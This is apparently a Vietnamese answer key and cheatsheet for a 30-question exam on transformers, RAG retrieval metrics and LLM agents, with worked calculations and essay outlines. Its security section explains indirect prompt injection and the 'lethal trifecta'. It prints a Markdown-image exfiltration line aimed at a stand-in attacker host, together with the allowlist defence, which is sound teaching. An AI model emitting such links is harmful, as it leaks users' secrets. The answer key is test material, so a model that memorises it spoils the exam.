# CĐ-10 · LLM, RAG và Agent — Cheatsheet

> 30 câu: A (Nhận biết, 1–8), B (Thông hiểu, 9–18), C (Vận dụng, 19–27), D (Vận dụng cao, 28–30; 28 & 30 là tự luận).

## Đáp án nhanh

| Câu | ĐA | Câu | ĐA | Câu | ĐA |
|---|---|---|---|---|---|
| 1 | C | 11 | **0,639** | 21 | A |
| 2 | C | 12 | B | 22 | B (≈4,2 GB) |
| 3 | D | 13 | **0,506** | 23 | D |
| 4 | C | 14 | C | 24 | C |
| 5 | C | 15 | C | 25 | **8** |
| 6 | B | 16 | **13** | 26 | **0,659** |
| 7 | A | 17 | B (6/8 = 0,75) | 27 | **0,417** |
| 8 | A | 18 | D | 28 | Tự luận (RAG) |
| 9 | **0,256** | 19 | **0,0484** | 29 | B |
| 10 | B (70%) | 20 | B | 30 | Tự luận (Agent) |

## Ý tưởng chính được kiểm tra

| Ý tưởng | Câu |
|---|---|
| Vector đã chuẩn hoá L2: $\|u-v\|^2 = 2-2\cos$ → xếp hạng theo Euclid và theo cosine trùng nhau | 1 |
| BPE: bắt đầu từ byte/ký tự, lặp lại việc gộp cặp liền kề hay gặp nhất | 2 |
| Attention: chia $\sqrt{d_k}$ để tránh softmax bão hoà; tự tính $\alpha$ | 8, 13 |
| Không có positional encoding → permutation-equivariant (không biết thứ tự) | 14 |
| KV cache = 2·L·d·bytes·T | 22 |
| Top-p sampling: lấy tập nhỏ nhất có tổng ≥ p rồi chuẩn hoá lại | 9 |
| Chunking: overlap giúp ý không bị cắt ngang; đếm số chunk theo stride | 3, 16 |
| Bi-encoder vs cross-encoder; reranker bị chặn trên bởi recall của tầng 1 | 6, 10 |
| BM25: bão hoà theo $f$, phạt tài liệu dài khi $b>0$ | 18 |
| Hybrid: điểm thô khác thang đo → dùng RRF hoặc chuẩn hoá điểm | 19, 24 |
| Metric truy xuất: recall@k (macro), MRR, nDCG | 11, 26, 27 |
| Ragas faithfulness; đọc metric để chọn tầng cần sửa | 17, 20 |
| Agent loop dừng khi LLM không gọi tool nữa; lỗi tool → trả tool result báo lỗi | 4, 15 |
| Ngân sách bước/thời gian (max_steps theo SLA); giới hạn độ lớn kết quả tool | 21, 25 |
| HITL = phải được duyệt trước khi thực thi | 5 |
| OWASP LLM Top 10 2025: LLM10 Unbounded Consumption; prompt injection; rò rỉ qua Markdown image | 7, 12, 23 |
| Lethal trifecta: dữ liệu riêng tư + nội dung không tin cậy + kênh gửi ra ngoài không ai duyệt | 29 |
| Thiết kế pipeline RAG và agent production | 28, 30 |

---

## 1. Transformer và LLM

**Scaled dot-product attention**
$$\text{Attention}(Q,K,V)=\text{softmax}\!\left(\frac{QK^\top}{\sqrt{d_k}}\right)V$$
- Nếu các thành phần có phương sai 1 thì $\text{Var}(q\cdot k)=d_k$. Chia cho $\sqrt{d_k}$ giữ độ lớn ổn định, nhờ đó softmax không bão hoà và gradient không bị triệt tiêu.
- Tổng mỗi hàng bằng 1 là nhờ **softmax**, không phải nhờ phép chia. Phép chia cũng **không** đổi độ phức tạp $O(n^2)$.

**Ví dụ (C13):** $d_k=4$, $q=(2,0,1,1)$, $k_1=(1,0,1,0)$, $k_2=(0,1,0,1)$, $k_3=(1,1,0,0)$
- Tích vô hướng: 3, 1, 2 → chia 2: 1,5; 0,5; 1,0
- $\alpha_1 = e^{1.5}/(e^{1.5}+e^{0.5}+e^{1}) = 4.482/8.849 =$ **0,506**

**Positional encoding (C14):** self-attention không có mask và không có thông tin vị trí là phép **permutation-equivariant**. Hoán vị đầu vào thì đầu ra chỉ bị hoán vị theo, nên mô hình không phân biệt được "chó cắn mèo" với "mèo cắn chó".

**BPE (C2):** bắt đầu từ byte hoặc ký tự, đếm các cặp liền kề, gộp cặp hay gặp nhất thành token mới, lặp đến khi đủ vocab. Không có UNK (vì có thể quay về byte). Số token ≠ số ký tự.

**KV cache (C22):**
$$\text{Bytes} = 2\,(K,V)\times L \times d_{model} \times \text{bytes/số} \times T$$
$2\cdot32\cdot4096\cdot2 = 524{,}288$ B/token; nhân 8000 token ≈ $4.19\times10^9$ B ≈ **4,2 GB**. (Quên hệ số 2 của K/V → 2,1 GB, đây là bẫy. Dùng GQA thì nhỏ hơn.)

**Top-p (nucleus) sampling (C9):** sắp xếp giảm dần, cộng dồn đến khi ≥ p, giữ tập đó rồi chuẩn hoá lại.
- p = (0,42; 0,23; 0,15; 0,10; …), p=0,85 → cộng dồn 0,42 → 0,65 → 0,80 → **0,90** ≥ 0,85, giữ 4 token.
- $P(\text{token 2}) = 0.23/0.90 =$ **0,256**

## 2. Embedding và chuẩn hoá (C1)
Với $\|u\|=\|v\|=1$: $\|u-v\|^2 = 2 - 2\cos(u,v)$. Khoảng cách tăng dần tương đương cosine giảm dần, nên thứ tự kNN là như nhau.

## 3. Chunking
- **Overlap (C3):** giảm rủi ro một ý bị cắt đôi ở ranh giới chunk. Overlap làm số chunk **tăng** và **không** thay được metadata.
- **Đếm chunk (C16):** stride $s = \text{size}-\text{overlap}$, chunk $i$ bắt đầu ở $i\cdot s$. Dừng ở $i$ nhỏ nhất thoả $i\cdot s + \text{size} \ge N$. Số chunk là $i+1$.
  - $N=5000$, size 512, overlap 128 → $s=384$; $384i+512\ge5000$ → $i=12$ → **13 chunk**.
  - Công thức nhanh: $\lceil (N-\text{size})/s\rceil + 1$.

## 4. Truy xuất: BM25, bi-/cross-encoder, hybrid

**BM25 (C18):** thành phần tần suất từ $\dfrac{f(k_1+1)}{f+k_1\left(1-b+b\frac{|d|}{\text{avgdl}}\right)}$
- **Bão hoà** khi $f\to\infty$, tiến tới $k_1+1$ (không tuyến tính).
- $b$ điều khiển **chuẩn hoá độ dài**: tài liệu dài hơn avgdl bị phạt khi $b>0$. $b$ không liên quan đến IDF.

**Bi-encoder và cross-encoder (C6):**
| | Bi-encoder | Cross-encoder |
|---|---|---|
| Cách làm | Encode query và doc riêng; doc encode trước; tra bằng ANN | Đọc **cùng lúc cặp (q, d)** rồi cho ra một điểm |
| Tốc độ | Nhanh, chạy được trên toàn kho | Chậm, chỉ dùng để rerank top-k |
| Độ chính xác | Thấp hơn | Cao hơn |

**Trần của reranker (C10):** reranker chỉ sắp xếp lại các ứng viên đã có. Top-5 sau rerank ≤ recall@50 của tầng 1 = 210/300 = **70%**.

**Hybrid và điểm khác thang đo (C24):** BM25 ∈ [0, 28] cộng cosine ∈ [0,2; 0,9] thì BM25 lấn át. Cách sửa: **RRF** (gộp theo hạng) hoặc **chuẩn hoá** (min-max/z-score) từng bộ rồi cộng có trọng số. Lấy max cũng không giải quyết được vấn đề khác thang đo.

**RRF (C19):** $\text{RRF}(d)=\sum_r \frac{1}{k+\text{rank}_r(d)}$, $k=60$
- D1: hạng (3, 1, 2) → $1/63+1/61+1/62 =$ **0,0484** (cao nhất)
- D3, D7: hạng {1, 2, 4} → 0,04815
- Mẹo: tổng hạng nhỏ nhất và có mặt ở nhiều danh sách nhất thì thắng.

## 5. Đánh giá RAG

| Metric | Công thức | Ví dụ trong đề |
|---|---|---|
| Recall@k | (số đoạn liên quan nằm trong top-k) / (tổng số đoạn liên quan) | Macro (C11): $(2/3+2/2+1/4)/3=$ **0,639** |
| MRR@k | trung bình của $1/\text{rank}$ của đoạn liên quan **đầu tiên** (không có thì 0) | C27: $(1/2+1+0+1/4+1/3)/5=$ **0,417** |
| DCG@k | $\sum \text{rel}_i/\log_2(i+1)$ | |
| nDCG@k | DCG/IDCG; IDCG tính trên **toàn bộ đoạn liên quan trong kho**, xếp theo thứ tự lý tưởng | C26 bên dưới |
| Faithfulness (Ragas) | (số khẳng định suy ra được từ context) / (tổng số khẳng định) | C17: 6/8 = **0,75** |

**C26 nDCG@4:** trả về (1,3,0,2) → DCG = 1 + 3/1,585 + 0 + 2/2,322 = 3,754. Lý tưởng (3,2,2,1) → IDCG = 3 + 1,262 + 1 + 0,431 = 5,693. Kết quả **0,659**.

**Faithfulness:** khẳng định "đúng theo hiểu biết chung nhưng không có trong context" vẫn tính là **không** faithful. Mẫu số là tổng số khẳng định (8), không phải 7.

**Đọc metric để chọn tầng cần sửa (C20):**
| Triệu chứng | Tầng | Cách sửa |
|---|---|---|
| Context recall/precision cao, faithfulness thấp, câu trả lời bịa số | **Generation** | Chỉ trả lời từ context, kèm trích dẫn, nói "không có thông tin" khi thiếu |
| Context recall thấp | Retrieval | Đổi embedding, dùng hybrid, tăng top-k ở tầng 1, sửa chunking |
| Context precision thấp | Retrieval/rerank | Thêm reranker, giảm k, lọc theo metadata |

## 6. Agent: vòng lặp, lỗi, ngân sách

```python
for step in range(max_steps):
    resp = llm(messages, tools)
    if not resp.tool_calls:          # câu trả lời cuối → kết thúc bình thường
        return resp.text
    for call in resp.tool_calls:
        try:
            out = run_tool(call)      # ứng dụng chạy tool, không phải LLM
            out = truncate_or_summarize(out)  # giới hạn kích thước (C21)
        except ValidationError as e:
            out = f"ERROR: date phải dạng YYYY-MM-DD ({e})"  # C15
        messages.append(tool_result(call.id, out))
# hết max_steps / token / thời gian → dừng an toàn, chuyển cho người
```
- **Điều kiện dừng (C4):** phản hồi không còn tool call. LLM **không** tự chạy hàm; ứng dụng mới là bên thực thi.
- **Lỗi tham số (C15):** bắt exception, trả tool result mô tả lỗi rõ ràng để LLM tự sửa, và giới hạn số lần thử lại.
- **Kết quả tool quá lớn (C21):** sửa tận gốc bằng cách lọc, phân trang, hoặc trả tóm tắt kèm ID để agent gọi tiếp khi cần. Context lớn hơn không giải quyết được chi phí và hiện tượng "lost in the middle".
- **max_steps theo SLA (C25):** $n\cdot(2.5+1.5+1.0) + 3 \le 45$ → $5n\le42$ → **n = 8**.
  - Tổng quát: $n_{max}=\lfloor (\text{SLA} - t_{final}) / t_{step} \rfloor$.

## 7. An toàn: HITL, OWASP, prompt injection

- **HITL (C5):** hành động thuộc nhóm cần duyệt chỉ được thực thi **sau khi** người có thẩm quyền xem và chấp thuận. Dashboard có nút stop hay báo cáo tuần không phải là HITL.
- **OWASP LLM Top 10 (2025)** gặp trong đề: LLM01 Prompt Injection · LLM02 Sensitive Information Disclosure · LLM07 System Prompt Leakage · **LLM10 Unbounded Consumption** (không giới hạn bước/token/request, gây hoá đơn tăng vọt hoặc DoS) (C7).
- **Indirect prompt injection (C12):** chỉ dẫn và dữ liệu nằm chung một chuỗi token, không có ranh giới cứng. Một câu "đừng làm theo email" trong system prompt chỉ giảm nhẹ rủi ro, không bảo đảm được.
- **Rò rỉ qua Markdown image (C23):** `![x](https://attacker/p.png?d=SECRET)` bị trình duyệt tự tải. Chặn bằng cách **lọc đầu ra**: chỉ render ảnh/link thuộc domain allowlist, hoặc hiển thị dạng plain text.
- **Lethal trifecta (C29):** rủi ro cao nhất khi có **cả 3**: dữ liệu riêng tư (CRM) + nội dung không tin cậy (email từ bên ngoài) + kênh gửi ra ngoài không ai duyệt (send_email tới địa chỉ bất kỳ). Bỏ được một yếu tố (có người duyệt, chỉ gửi nội bộ, không có dữ liệu nội bộ) là rủi ro giảm mạnh.

## 8. Tự luận: khung trả lời

**C28: RAG cho quy chế đào tạo (1.500 văn bản, 10% thay đổi mỗi học kỳ, p95 ≤ 4 s, có trích dẫn)**
1. *Ingestion:* parse PDF/HTML theo cấu trúc (chương/điều/khoản). Chunk khoảng 300–800 token, overlap 10–20%. Metadata: doc_id, tiêu đề, số điều, ngày hiệu lực/hết hiệu lực, phiên bản, URL, trang. Văn bản hết hiệu lực thì gắn cờ hoặc lọc ra lúc truy xuất. Re-index tăng dần.
2. *Truy xuất:* hybrid BM25 (bắt được mã học phần "IT3090" và số điều) + vector (câu hỏi tự nhiên). Mỗi bộ lấy top-k khoảng 20–50, gộp bằng **RRF (k=60)**, rerank bằng cross-encoder lấy top-5 đưa vào LLM. Lọc metadata `còn hiệu lực`. Cân đối với ngân sách độ trễ.
3. *Đánh giá:* golden set khoảng 200–300 câu có nhãn (phân theo loại: mã, điều khoản, câu tự nhiên, câu không có đáp án). Retrieval: recall@k, nDCG@k/MRR. Generation: faithfulness, answer relevancy, tỉ lệ trích dẫn đúng. LLM-as-judge **hiệu chuẩn** với nhãn người (đo độ đồng thuận). Đặt ngưỡng chặn phát hành (ví dụ recall@5 ≥ 0,9, faithfulness ≥ 0,9) và chạy regression test mỗi lần đổi.
4. *Rủi ro:* trả lời theo văn bản cũ hoặc hết hiệu lực, hoặc drift khi tài liệu cập nhật. Giám sát: log trích dẫn, tỉ lệ dùng văn bản hết hiệu lực, feedback người dùng, chấm mẫu định kỳ.

**C30: Agent khiếu nại logistics (3.000 lượt/ngày)**
1. *Vòng lặp:* đặt max_steps (khoảng 8), ngân sách token và thời gian, phát hiện lặp (cùng tool + cùng tham số lặp lại thì dừng). Ví dụ tính ngân sách: n × (LLM + tool lâu nhất 10 s + guardrail) + bước cuối ≤ SLA. Đặt timeout cho track_shipment.
2. *Phân quyền:* get_order, track_shipment, search_policy tự chạy (chỉ đọc). issue_voucher dưới ngưỡng nhỏ có thể tự chạy; **refund** và voucher vượt ngưỡng cần **duyệt**. send_message nên duyệt hoặc dùng template. Màn hình duyệt hiển thị: đơn hàng, bằng chứng, điều khoản chính sách được trích, số tiền, lý do của agent.
3. *Prompt injection:* coi nội dung khiếu nại và kết quả tool là dữ liệu (đặt trong delimiter). Kiểm tra tham số **phía ứng dụng**: order_id phải thuộc đúng khách, amount ≤ giá trị đơn và ≤ ngưỡng, customer_id khớp. Áp dụng least privilege và lọc đầu ra.
4. *Log và đánh giá:* log mọi lượt gọi tool và quyết định duyệt. Chỉ số: tỉ lệ giải quyết, tỉ lệ bị từ chối khi duyệt, số tiền sai, độ trễ p95, chi phí/ca, sự cố injection. Chạy shadow/pilot trước, chỉ mở rộng khi đạt ngưỡng.

---

## Bẫy thường gặp

| Phương án nhiễu | Vì sao sai |
|---|---|
| $\|u-v\| = 1-\cos$ hoặc $\|u-v\|^2=\cos$ | Đúng là $\|u-v\|^2 = 2-2\cos$ |
| BPE dùng từ điển kèm UNK, hoặc 1 ký tự = 1 token | BPE gộp cặp dần từ byte nên không cần UNK |
| Chia $\sqrt{d_k}$ để chuẩn hoá thành cosine / để tổng hàng = 1 / để giảm $O(n^2)$ | Chỉ để kiểm soát độ lớn của tích vô hướng, tránh softmax bão hoà |
| Overlap giảm số chunk hoặc thay được metadata | Overlap làm số chunk tăng; metadata vẫn cần |
| Cross-encoder nhanh, dùng ANN | Đó là bi-encoder. Cross-encoder chậm, chỉ dùng để rerank |
| Reranker tốt lên được 100% | Bị chặn bởi recall của tầng 1 (70%) |
| Faithfulness 6/7 hoặc 7/8 | Khẳng định đúng theo hiểu biết chung nhưng không có trong context vẫn không faithful; mẫu số là 8 |
| BM25 tăng tuyến tính; $b$ điều khiển IDF; tài liệu dài được cộng điểm | Bão hoà về $k_1+1$; $b$ là chuẩn hoá độ dài (phạt tài liệu dài) |
| Bỏ hẳn BM25 / lấy max / tăng số chiều embedding | Vấn đề nằm ở thang đo, nên dùng RRF hoặc chuẩn hoá |
| KV cache 2,1 GB | Quên hệ số 2 (lưu cả K và V) |
| Faithfulness thấp nên đổi embedding / tăng top-k / giảm chunk | Retrieval đang tốt; phải sửa tầng sinh |
| Context lớn hơn / tăng max_tokens / giảm max_steps=2 | Không sửa gốc; phải giới hạn kích thước kết quả tool |
| Retry y nguyên lời gọi / tăng temperature / bỏ validate | Phải trả lỗi rõ ràng cho LLM và giới hạn số lần thử lại |
| Vòng lặp dừng khi đã gọi hết tool / khi có kết quả không rỗng / khi "LLM tự chạy hàm" | Dừng khi phản hồi không còn tool call |
| HITL = dashboard có nút stop / báo cáo tuần / viết prompt một lần | HITL phải duyệt **trước** khi thực thi |
| Prompt dài hơn / model lớn hơn / mã hoá vector DB để chặn exfil qua ảnh | Phải chặn kênh rò rỉ bằng lọc đầu ra theo allowlist |
| Injection chỉ đến từ người dùng gõ vào chat | Indirect injection đến từ dữ liệu bên ngoài (email, web, tài liệu) |
| LLM01/02/07 cho trường hợp hoá đơn tăng vọt | Đó là LLM10 Unbounded Consumption |
| Không có positional encoding thì attention đều 1/n hoặc báo lỗi | Đầu ra chỉ bị hoán vị theo (equivariant) |

## Tra nhanh

| Nếu gặp… | Thì dùng… |
|---|---|
| So khớp vector đã chuẩn hoá L2 | Euclid hoặc cosine đều được, thứ tự như nhau |
| Tính trọng số attention | Lấy $q\cdot k_j/\sqrt{d_k}$ rồi softmax |
| Ước lượng bộ nhớ KV cache | $2\cdot L\cdot d\cdot \text{bytes}\cdot T$ (GQA: thay $d$ bằng $n_{kv}\cdot d_{head}$) |
| Top-p | Cộng dồn đến ≥ p rồi chia mỗi xác suất cho tổng của tập |
| Đếm số chunk | $\lceil (N-\text{size})/(\text{size}-\text{overlap})\rceil+1$ |
| Truy vấn chứa mã hoặc số hiệu (IT3090, Điều 5) | BM25 / hybrid |
| Gộp nhiều retriever khác thang đo | RRF $k=60$ hoặc chuẩn hoá rồi cộng có trọng số |
| Cần độ chính xác cao ở top-5 | Cross-encoder rerank top-20..50 |
| Muốn biết trần sau rerank | recall@K của tầng 1 |
| Recall@k macro | Trung bình của tỉ lệ từng câu |
| MRR | $1/\text{rank}$ của đoạn liên quan đầu tiên, rồi lấy trung bình |
| nDCG | IDCG tính từ toàn bộ đoạn liên quan trong kho, xếp giảm dần |
| Faithfulness thấp, retrieval tốt | Ép trả lời từ context, kèm trích dẫn, cho phép "không biết" |
| Tool ném exception | Trả error vào tool result và giới hạn số lần retry |
| Kết quả tool khổng lồ | Lọc, phân trang, tóm tắt kèm ID |
| Đặt max_steps theo SLA | $\lfloor(\text{SLA}-t_{final})/t_{step}\rfloor$ |
| Hành động tốn tiền hoặc không đảo ngược được (refund, gửi email ra ngoài) | HITL kèm ngưỡng tiền, kiểm tra tham số phía ứng dụng |
| Lo bị rò rỉ dữ liệu qua injection | Phá lethal trifecta: bỏ 1 trong 3 yếu tố, allowlist đầu ra |
| Agent public bị spam gây tốn tiền | Rate limit, max_steps, ngân sách token (LLM10) |
